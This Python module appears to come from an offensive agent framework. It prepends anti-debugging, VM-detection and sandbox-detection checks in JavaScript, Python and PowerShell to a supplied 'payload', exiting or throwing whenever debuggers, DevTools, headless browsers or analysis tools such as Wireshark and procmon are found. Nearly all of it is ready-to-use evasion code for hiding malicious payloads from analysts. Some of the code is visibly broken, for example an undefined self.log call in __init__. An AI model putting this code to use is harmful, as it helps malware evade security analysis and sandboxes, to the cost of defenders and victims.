from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
"""
Anti-Debugging and Anti-Analysis Techniques
เทคนิคป้องกันการวิเคราะห์และ debug
"""

import random
from typing import Dict, List
from datetime import datetime
from core.logger import log


class AntiDebugTechniques:
    """
    Anti-debugging and anti-analysis techniques
    
    Features:
    - Debugger detection
    - Timing checks
    - Environment checks
    - Sandbox detection
    - VM detection
    """
    
    def __init__(self):
        """Initialize anti-debug techniques"""
        self.log(f"{self.__class__.__name__} method called")
            
    async def run(self, target: Dict) -> Dict:
        """
        Main entry point for anti-debug payload generation
        
        Args:
            target: Dict containing:
                - payload: Base payload to protect
                - language: Programming language (default: javascript)
                - anti_debug: Include anti-debug checks (default: True)
                - sandbox_detection: Include sandbox detection (default: True)
        
        Returns:
            Dict with protected payload
        """
        payload = target.get('payload', '')
        language = target.get('language', 'javascript')
        anti_debug = target.get('anti_debug', True)
        sandbox_detection = target.get('sandbox_detection', True)
        
        if not payload:
            return {
                'success': False,
                'error': 'No payload provided'
            }
        
        try:
            result = await self.generate_evasion_payload(
                base_payload=payload,
                language=language,
                include_anti_debug=anti_debug,
                include_sandbox_detection=sandbox_detection
            )
            
            return result
        
        except Exception as e:
            log.error(f"[AntiDebug] Run failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def generate_anti_debug_checks(self, language: str = "javascript") -> str:
        """
        Generate anti-debugging checks
        
        Args:
            language: Programming language
        
        Returns:
            Anti-debug code
        """
        if language == "javascript":
            return self._generate_javascript_anti_debug()
        elif language == "python":
            return self._generate_python_anti_debug()
        elif language == "powershell":
            return self._generate_powershell_anti_debug()
        else:
            return "// Anti-debug not implemented for this language\n"
    
    def _generate_javascript_anti_debug(self) -> str:
        """Generate JavaScript anti-debugging code"""
        
        code = """
// Anti-Debugging Checks

// 1. DevTools detection
(function() {
    var devtools = {open: false, orientation: null};
    var threshold = 160;
    
    var emitEvent = function(state, orientation) {
        if (devtools.open !== state || devtools.orientation !== orientation) {
            if (state) {
                // DevTools detected - exit or corrupt payload
                throw new Error('Debug detected');
            }
        }
    };
    
    setInterval(function() {
        var widthThreshold = window.outerWidth - window.innerWidth > threshold;
        var heightThreshold = window.outerHeight - window.innerHeight > threshold;
        var orientation = widthThreshold ? 'vertical' : 'horizontal';
        
        if (!(heightThreshold && widthThreshold) &&
            ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
            emitEvent(true, orientation);
        } else {
            emitEvent(false, null);
        }
    }, 500);
})();

// 2. Timing checks
(function() {
    var start = Date.now();
    debugger;
    var end = Date.now();
    
    if (end - start > 100) {
        // Debugger detected
        throw new Error('Timing anomaly detected');
    }
})();

// 3. Console detection
(function() {
    var element = new Image();
    Object.defineProperty(element, 'id', {
        get: function() {
            // Console is open
            throw new Error('Console detected');
        }
    });
    console.log(element);
})();

// 4. Function decompilation check
(function() {
    var check = function() {};
    if (check.toString().length < 20) {
        // Function has been modified
        throw new Error('Function tampering detected');
    }
})();

// 5. Chrome DevTools detection
(function() {
    var checkStatus;
    var element = new Image();
    
    Object.defineProperty(element, 'id', {
        get: function() {
            checkStatus = 'on';
            throw new Error('DevTools detected');
        }
    });
    
    requestAnimationFrame(function check() {
        checkStatus = 'off';
        console.dir(element);
        if (checkStatus === 'on') {
            // DevTools is open
            throw new Error('DevTools detected');
        }
        requestAnimationFrame(check);
    });
})();

// 6. Performance timing check
(function() {
    var before = performance.now();
    debugger;
    var after = performance.now();
    
    if (after - before > 100) {
        throw new Error('Performance timing anomaly');
    }
})();
"""
        
        return code
    
    def _generate_python_anti_debug(self) -> str:
        """Generate Python anti-debugging code"""
        
        code = """
# Anti-Debugging Checks

import sys
import os
import time
import ctypes

# 1. Check for debugger
def check_debugger():
    if sys.gettrace() is not None:
        sys.exit(1)

# 2. Check for common debugging tools
def check_debug_tools():
    debug_tools = ['gdb', 'lldb', 'strace', 'ltrace', 'ida', 'radare2']
    
    import psutil
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() in debug_tools:
            sys.exit(1)

# 3. Timing check
def timing_check():
    start = time.time()
    # Some operation
    x = sum(range(1000))
    end = time.time()
    
    if end - start > 0.1:
        sys.exit(1)

# 4. Check for ptrace
def check_ptrace():
    try:
        if os.name == 'posix':
            # Try to ptrace ourselves
            libc = ctypes.CDLL('libc.so.6')
            if libc.ptrace(0, 0, 0, 0) == -1:
                # Already being traced
                sys.exit(1)
    except Exception as e:
        print("Error occurred")

# 5. Check environment variables
def check_environment():
    debug_vars = ['PYTHONBREAKPOINT', 'PYTHONDEBUG', 'PYTHONINSPECT']
    
    for var in debug_vars:
        if var in os.environ:
            sys.exit(1)

# 6. VM detection
def check_vm():
    vm_indicators = [
        '/sys/class/dmi/id/product_name',
        '/sys/class/dmi/id/sys_vendor'
    ]
    
    vm_strings = ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen']
    
    for indicator in vm_indicators:
        try:
            with open(indicator, 'r') as f:
                content = f.read().lower()
                if any(vm in content for vm in vm_strings):
                    sys.exit(1)
        except Exception as e:
            print("Error occurred")

# Run all checks
check_debugger()
check_debug_tools()
timing_check()
check_ptrace()
check_environment()
check_vm()
"""
        
        return code
    
    def _generate_powershell_anti_debug(self) -> str:
        """Generate PowerShell anti-debugging code"""
        
        code = """
# Anti-Debugging Checks

# 1. Check for debugger
function Check-Debugger {
    if ([System.Diagnostics.Debugger]::IsAttached) {
        exit 1
    }
}

# 2. Check for common debugging tools
function Check-DebugTools {
    $debugTools = @('windbg', 'x64dbg', 'x32dbg', 'ollydbg', 'ida', 'processhacker')
    
    $processes = Get-Process
    foreach ($proc in $processes) {
        if ($debugTools -contains $proc.Name.ToLower()) {
            exit 1
        }
    }
}

# 3. Timing check
function Check-Timing {
    $start = Get-Date
    
    # Some operation
    $sum = 0
    for ($i = 0; $i -lt 1000; $i++) {
        $sum += $i
    }
    
    $end = Get-Date
    $elapsed = ($end - $start).TotalMilliseconds
    
    if ($elapsed -gt 100) {
        exit 1
    }
}

# 4. Check for VM
function Check-VM {
    $vmIndicators = @(
        'HKLM:\\SOFTWARE\\VMware, Inc.\\VMware Tools',
        'HKLM:\\SOFTWARE\\Oracle\\VirtualBox Guest Additions'
    )
    
    foreach ($indicator in $vmIndicators) {
        if (Test-Path $indicator) {
            exit 1
        }
    }
    
    # Check BIOS
    $bios = Get-WmiObject -Class Win32_BIOS
    $vmStrings = @('vmware', 'virtualbox', 'qemu', 'xen')
    
    foreach ($vmString in $vmStrings) {
        if ($bios.Manufacturer.ToLower().Contains($vmString) -or 
            $bios.Version.ToLower().Contains($vmString)) {
            exit 1
        }
    }
}

# 5. Check for sandbox
function Check-Sandbox {
    # Check for low disk space (common in sandboxes)
    $disk = Get-WmiObject -Class Win32_LogicalDisk -Filter "DeviceID='C:'"
    $sizeGB = [math]::Round($disk.Size / 1GB, 2)
    
    if ($sizeGB -lt 60) {
        exit 1
    }
    
    # Check for low RAM
    $ram = Get-WmiObject -Class Win32_ComputerSystem
    $ramGB = [math]::Round($ram.TotalPhysicalMemory / 1GB, 2)
    
    if ($ramGB -lt 4) {
        exit 1
    }
    
    # Check uptime (sandboxes often have low uptime)
    $uptime = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
    
    if ($uptime.TotalMinutes -lt 10) {
        exit 1
    }
}

# 6. Check for analysis tools
function Check-AnalysisTools {
    $analysisTools = @(
        'wireshark',
        'fiddler',
        'procmon',
        'procexp',
        'tcpview',
        'autoruns'
    )
    
    $processes = Get-Process
    foreach ($proc in $processes) {
        if ($analysisTools -contains $proc.Name.ToLower()) {
            exit 1
        }
    }
}

# Run all checks
Check-Debugger
Check-DebugTools
Check-Timing
Check-VM
Check-Sandbox
Check-AnalysisTools
"""
        
        return code
    
    def generate_sandbox_detection(self, language: str = "javascript") -> str:
        """
        Generate sandbox detection code
        
        Args:
            language: Programming language
        
        Returns:
            Sandbox detection code
        """
        if language == "javascript":
            code = """
// Sandbox Detection

// 1. Check for headless browser
if (navigator.webdriver) {
    throw new Error('Headless browser detected');
}

// 2. Check for automation
if (window.navigator.plugins.length === 0) {
    throw new Error('No plugins - likely automated');
}

// 3. Check for PhantomJS
if (window._phantom || window.callPhantom) {
    throw new Error('PhantomJS detected');
}

// 4. Check for Selenium
if (window.document.$cdc_asdjflasutopfhvcZLmcfl_) {
    throw new Error('Selenium detected');
}

// 5. Check for unusual window properties
if (window.outerWidth === 0 || window.outerHeight === 0) {
    throw new Error('Unusual window dimensions');
}
"""
        
        elif language == "python":
            code = """
# Sandbox Detection

import os
import sys

# 1. Check for common sandbox paths
workspace_dir = os.getenv('WORKSPACE_DIR', 'workspace')
sandbox_paths = [
    os.path.join(os.getenv('TMP_DIR', '/tmp'), 'analysis'),
    os.path.join(workspace_dir, 'malware'),
    os.path.join(os.getenv('HOME', '/root'), 'sample'),
    'C:\\\\analysis',
    'C:\\\\sandbox'
]

for path in sandbox_paths:
    if os.path.exists(path):
        sys.exit(1)

# 2. Check for low file count (sandboxes often have minimal files)
if os.name == 'nt':
    file_count = len(os.listdir('C:\\\\Windows\\\\System32'))
    if file_count < 1000:
        sys.exit(1)
"""
        
        else:
            code = "# Sandbox detection not implemented\n"
        
        return code
    
    async def generate_evasion_payload(
        self,
        base_payload: str,
        language: str = "javascript",
        include_anti_debug: bool = True,
        include_sandbox_detection: bool = True
    ) -> Dict:
        """
        Generate payload with evasion techniques
        
        Args:
            base_payload: Original payload
            language: Programming language
            include_anti_debug: Include anti-debugging checks
            include_sandbox_detection: Include sandbox detection
        
        Returns:
            Dict with evasion payload
        """
        try:
            log.info(f"[AntiDebug] Generating evasion payload for {language}")
            
            parts = []
            
            # Add anti-debugging checks
            if include_anti_debug:
                parts.append(self.generate_anti_debug_checks(language))
            
            # Add sandbox detection
            if include_sandbox_detection:
                parts.append(self.generate_sandbox_detection(language))
            
            # Add base payload
            parts.append(base_payload)
            
            # Combine
            evasion_payload = '\n\n'.join(parts)
            
            return {
                "success": True,
                "payload": evasion_payload,
                "language": language,
                "anti_debug": include_anti_debug,
                "sandbox_detection": include_sandbox_detection,
                "size": len(evasion_payload),
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[AntiDebug] Evasion payload generation failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }

